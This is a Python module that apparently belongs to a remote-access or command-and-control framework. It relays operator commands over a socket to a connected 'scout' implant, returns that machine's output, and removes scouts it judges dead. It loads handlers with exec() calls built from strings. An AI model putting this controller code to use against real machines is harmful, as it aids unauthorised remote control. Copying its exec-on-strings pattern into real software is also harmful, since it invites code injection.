# API
# done
import socket
import pyiris_api.library.modules.send_all as send_all
import pyiris_api.library.modules.recv_all as recv_all


def check_imports(self):
    self.special_commands = [x["command"] for x in self.config.scout_custom_handlers]
    for command_handler_pair in self.config.scout_custom_handlers:
        to_import = command_handler_pair["handler"]
        exec("global " + to_import.replace('.', '_'), globals())
        exec(f"{to_import.replace('.', '_')} = __import__('{to_import}', globals(), locals(), ['{to_import}'])", globals())


def main(self, command):
    try:
        if self.config.bridged_to is not None:
            main_command = command.split(" ")[0]
            if main_command in self.special_commands:
                custom_handler = [x["handler"] for x in self.config.scout_custom_handlers if x["command"] == main_command][0]
                output = exec_with_return(f"{custom_handler.replace('.', '_')}.main(self, self.config.scout_database[self.config.bridged_to][0], command)", self=self, command=command)
                return output
            else:
                send_all.main(self.config.scout_database[self.config.bridged_to][0], command)
                data = recv_all.main(self.config.scout_database[self.config.bridged_to][0])
                self.log.blank(data)
                return {"status": "ok", "message": "", "data": {"scout_output": data}}
        else:
            return {"status": "error", "message": "Please bridge to a scout first", "data": None}
    except socket.error:
        try:
            self.log.err('Scout is dead, removing from database...')
            currently_bridged = self.config.bridged_to
            self.config.bridged_to = None
            del (self.config.scout_database[currently_bridged])
            self.config.change = True
        except IndexError:
            self.log.err('Scout does not exist in database!')
        return {"status": "error", "message": "", "data": {"scout_output": '[-]Scout is dead, removing from database...'}}


def exec_with_return(code, **kwargs):
    for key, value in kwargs.items():
        exec(key + " = value")
    exec('global exec_return_stuff; exec_return_stuff = %s' % code)
    global exec_return_stuff
    return exec_return_stuff